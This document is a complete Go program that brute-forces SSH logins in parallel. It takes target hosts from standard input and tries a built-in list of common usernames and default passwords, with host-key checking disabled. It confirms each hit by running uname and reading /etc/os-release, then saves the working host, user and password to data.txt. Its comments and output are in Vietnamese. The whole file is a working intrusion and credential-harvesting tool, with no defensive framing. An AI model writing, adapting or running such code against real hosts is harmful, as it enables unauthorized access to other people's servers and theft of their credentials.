package main

import (
    "bufio"
    "fmt"
    "golang.org/x/crypto/ssh"
    "os"
    "strings"
    "sync"
    "time"
)

var (
    users     = []string{"root", "admin", "user", "test", "ubuntu", "ec2-user", "vagrant"}
    passwords = []string{
        "password", "123456", "admin", "admin123", "root", "toor",
        "qwerty", "password123", "123456789", "admin@123", "P@ssw0rd",
        "changeme", "secret", "1234", "12345", "raspberry",
        "letmein", "welcome", "test123", "user", "default", "mk123@",
    }

    syncWait = sync.WaitGroup{}
    timeout  = 15 * time.Second
)

func tryLogin(host, user, pass string) bool {
    config := &ssh.ClientConfig{
        User: user,
        Auth: []ssh.AuthMethod{
            ssh.Password(pass),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout:         timeout,
    }

    conn, err := ssh.Dial("tcp", host, config)
    if err != nil {
        return false
    }
    defer conn.Close()

    session, err := conn.NewSession()
    if err != nil {
        return false
    }
    defer session.Close()

    output, err := session.CombinedOutput(`uname -a && echo "====" && cat /etc/os-release`)
    if err != nil {
        return false
    }

    parts := strings.Split(string(output), "====")
    if len(parts) < 2 || !strings.Contains(parts[1], "NAME=") {
        // Không có nội dung hợp lệ từ /etc/os-release → bỏ qua
        return false
    }

    // Có đủ thông tin → coi là thành công thật
    fmt.Printf("[✔] Thành công: %s:%s@%s\n", user, pass, host)
    fmt.Println("→ Thông tin hệ thống:")
    fmt.Println(strings.TrimSpace(string(output)))

    f, err := os.OpenFile("data.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err == nil {
        defer f.Close()
        f.WriteString(fmt.Sprintf("%s:%s:%s\n", host, user, pass))
    }

    return true
}

func processTarget(target string) {
    defer syncWait.Done()
    for _, user := range users {
        for _, pass := range passwords {
            if tryLogin(target, user, pass) {
                return
            }
        }
    }
}

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage: ./tool <port | listen>")
        return
    }

    scan := bufio.NewScanner(os.Stdin)
    for scan.Scan() {
        target := strings.TrimSpace(scan.Text())
        if target == "" {
            continue
        }

        var fullTarget string
        if os.Args[1] == "listen" {
            fullTarget = target
        } else {
            fullTarget = target + ":" + os.Args[1]
        }

        syncWait.Add(1)
        go processTarget(fullTarget)
    }

    if err := scan.Err(); err != nil {
        fmt.Fprintf(os.Stderr, "Lỗi khi đọc input: %v\n", err)
    }

    syncWait.Wait()
}
